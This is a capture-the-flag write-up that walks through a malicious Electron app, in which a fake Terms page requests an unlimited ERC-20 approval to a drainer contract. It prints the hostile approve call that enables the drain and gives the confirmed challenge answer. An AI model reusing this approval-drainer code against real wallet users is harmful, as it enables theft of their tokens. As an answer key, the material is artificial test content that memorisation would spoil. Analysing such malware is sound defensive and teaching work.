# SilentDividend Q8 — Finding the MaxUint256 approval amount

**Challenge:** Holmes CTF 2026 — Sherlock 01 / Silent Dividend  
**Question:** What is the exact token amount passed to the approval call? (number)  
**Answer (confirmed):**  
`115792089237316195423570985008687907853269984665640564039457584007913129639935`  
**Format:** decimal integer — **not** `MaxUint256`, **not** hex, **not** `HTB{...}`

---

## What the question is asking

The fake Terms page does not ask for a payment. It asks the wallet for a **token approval** (spend permission) to the drainer contract.

“How much?” is **not** “10 tokens.” It is **unlimited** approval: ethers v6 **`MaxUint256`** = **2²⁵⁶ − 1**.

The UI wants the **exact number**.

---

## Attack path

### 1. Find the drainer page in the package

Unpack installer → extract `app.asar` → open:

```text
asar/src/settlement.html
```

(The same file is also copied by preload for the `%TEMP%` open path — analysis uses the **package** copy.)

### 2. Read the approval function

**File:** `asar/src/settlement.html`

```javascript
async function requestApproval() {
    const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
    const unlimitedAmount = ethers.MaxUint256;

    const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
    await tx.wait();
}
```

`unlimitedAmount` is passed straight into **`approve`**.

### 3. Resolve `ethers.MaxUint256` to a number

In the same asar: `node_modules/ethers/.../constants` defines:

```javascript
export const MaxUint256 = BigInt(
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
);
```

That is **64 hex `f`s** = **2²⁵⁶ − 1**.

### 4. Convert hex → decimal (what you submit)

```javascript
const { ethers } = require("ethers");
console.log(ethers.MaxUint256.toString());
// 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

Or in Python:

```python
print(2**256 - 1)
# 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

### 5. Submit (confirmed)

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

**Wrong variants (do not submit):**

| Variant | Why wrong |
|---------|-----------|
| `MaxUint256` | Constant **name**, question says **number** |
| `0xfff…ff` (64 f’s) | Hex, not decimal |
| `2^256-1` / `2**256-1` | Expression, not the integer |
| `unlimited` | English word |

---

## Why this is the real attack

Unlimited ERC-20 `approve(spender, MaxUint256)` lets the **drainer contract** later `transferFrom` **every** token balance the victim holds — classic approval-drainer pattern (see contract `x0` / `x11` in `wallet.sol` on Sepolia).

Story layer: “settlement” payment.  
Chain layer: **silent dividend** = attacker drains tokens after ToS click.

---

## Team checklist

- [ ] Open `settlement.html` from asar (or extracted src).
- [ ] Find `ethers.MaxUint256` in `requestApproval`.
- [ ] Expand to decimal `2**256 - 1`.
- [ ] Copy-paste the full integer carefully (78 digits).
- [ ] Submit bare number only.

---

## One-line brief

> ToS page calls `approve(drainer, ethers.MaxUint256)` — submit 2²⁵⁶−1 as decimal.

---

*Confirmed flag.*
